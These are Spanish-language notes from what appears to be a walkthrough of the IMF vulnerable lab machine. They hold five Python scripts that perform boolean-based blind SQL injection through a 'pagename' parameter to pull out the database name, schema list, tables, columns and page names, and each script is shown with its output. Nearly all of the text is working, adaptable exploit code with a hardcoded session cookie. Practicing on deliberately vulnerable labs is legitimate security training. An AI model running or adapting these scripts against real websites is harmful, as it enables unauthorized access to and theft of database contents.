
---

Script para extraer el nombre de la **base de datos actualmente en uso**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\i\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_lowercase
main_url = "http://192.168.1.67/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=v97v57k6rvs5d4fntn0b3pbr33'  # Cambiar este valor por las cookies correspondientes
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 6):
        for character in characters:

            sqli_url = main_url + "home' or substring(database(),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                break

    p1.success("Ataque de SQLI finalizado exitosamente")
    p2.success(data)

if __name__ == '__main__':
    sqli()
```

Resultado:

```bash
[+] SQLI: Ataque de SQLI finalizado exitosamente
[+] Data: admin
```

Script para extraer el nombre de todas las **bases de datos** existentes

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\i\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_lowercase + "_,-" + string.digits
main_url = "http://192.168.1.67/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=v97v57k6rvs5d4fntn0b3pbr33'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                break

    p1.success("Ataque de SQLI finaliado exitosamente")
    p2.success(data)

if __name__ == '__main__':
    sqli()
```

Resultado:

```bash
[+] SQLI: Ataque de SQLI finaliado exitosamente
[+] Data: information_schema,admin,mysql,performance_schema,sys
```

Script para extraer el nombre de las **tablas**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\i\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_lowercase + "_,-" + string.digits
main_url = "http://192.168.1.67/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=v97v57k6rvs5d4fntn0b3pbr33'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(table_name) from information_schema.tables where table_schema='admin'),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                break

    p1.success("Ataque de SQLI finaliado exitosamente")
    p2.success(data)

if __name__ == '__main__':
    sqli()
```

Resultado:

```bash
[+] SQLI: Ataque de SQLI finaliado exitosamente
[+] Data: pages
```

Script para extraer el nombre de las **columnas**


```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\i\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_lowercase + "_,-" + string.digits
main_url = "http://192.168.1.67/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=v97v57k6rvs5d4fntn0b3pbr33'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(column_name) from information_schema.columns where table_schema='admin' and table_name='pages'),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                break

    p1.success("Ataque de SQLI finaliado exitosamente")
    p2.success(data)

if __name__ == '__main__':
    sqli()
```

Resultado:

```bash
[+] SQLI: Ataque de SQLI finaliado exitosamente
[+] Data: id,pagename,pagedata
```

Script para extraer el la **información de una columna**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\i\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_lowercase + "_,;:-" + string.digits
main_url = "http://192.168.1.67/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=v97v57k6rvs5d4fntn0b3pbr33'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 300):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:
                data += character
                break

    p1.success("Ataque de SQLI finaliado exitosamente")
    p2.success(data)

if __name__ == '__main__':
    sqli()
```

Resultado:

```bash
[+] SQLI: Ataque de SQLI finaliado exitosamente
[+] Data: disavowlist,home,tutorials-incomplete,upload
```

---
